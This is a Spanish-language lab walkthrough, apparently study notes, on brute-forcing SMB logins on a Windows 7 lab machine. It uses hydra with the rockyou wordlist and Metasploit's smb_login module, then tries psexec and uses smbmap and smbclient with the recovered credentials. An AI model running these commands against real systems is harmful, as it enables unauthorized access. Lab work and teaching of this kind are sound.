# 5   Hydra   Ataque de Fuerza Bruta SMB

Vamos a utilizar la máquina Windows 7 que ya tiene habilitado el login por SMB.

{% stepper %}
{% step %}
### 1) Comprobación de acceso SMB desde Kali

Vemos que desde Kali podemos iniciar sesión por SMB:\
!\[\[Pasted image 20231105161032.png]]
{% endstep %}

{% step %}
### 2) Fuerza bruta con hydra

Podemos intentar iniciar sesión por SMB usando hydra:

{% code title="Comando" %}
```bash
hydra -l mario -P /usr/share/wordlists/rockyou.txt smb://192.168.0.28
```
{% endcode %}

Captura del intento:\
!\[\[Pasted image 20231105161117.png]]
{% endstep %}

{% step %}
### 3) Fuerza bruta con Metasploit (auxiliary scanner smb\_login)

También podemos hacer otro ataque de fuerza bruta con el módulo auxiliary/scanner/smb/smb\_login de Metasploit.

Configuramos el diccionario (rockyou o unix\_passwords), RHOSTS y lanzamos el ataque:\
!\[\[Pasted image 20231105162621.png]]\
!\[\[Pasted image 20231105163433.png]]

El módulo nos encuentra la contraseña:\
!\[\[Pasted image 20231105163511.png]]
{% endstep %}

{% step %}
### 4) Intento de acceso con psexec

Una vez obtenido el usuario/contraseña, podemos intentar entrar en la máquina usando psexec:

{% code title="Comando Metasploit" %}
```
use exploit/windows/smb/psexec
```
{% endcode %}

Cargamos las credenciales obtenidas:\
!\[\[Pasted image 20231105163717.png]]

En este caso el intento con psexec no funcionó:\
!\[\[Pasted image 20231105163733.png]]

{% hint style="warning" %}
Aunque psexec es una opción común para post-explotación SMB, no siempre funciona (por permisos, configuración del objetivo, parches, etc.). En este escenario no se obtuvo sesión con psexec.
{% endhint %}
{% endstep %}

{% step %}
### 5) Enumeración y acceso a recursos SMB con smbmap y smbclient

Podemos entrar por SMB y enumerar los recursos compartidos usando smbmap:

{% code title="Comando smbmap" %}
```bash
smbmap -H 192.168.0.28 -u mario -p 123123 -r Users
```
{% endcode %}

Captura de smbmap:\
!\[\[Pasted image 20231105163828.png]]

Una vez enumerado el recurso compartido, podemos acceder a él usando smbclient:

{% code title="Comando smbclient" %}
```bash
smbclient -U 'mario' //192.168.0.28/Users
```
{% endcode %}

Captura de smbclient:\
!\[\[Pasted image 20231105164156.png]]
{% endstep %}
{% endstepper %}
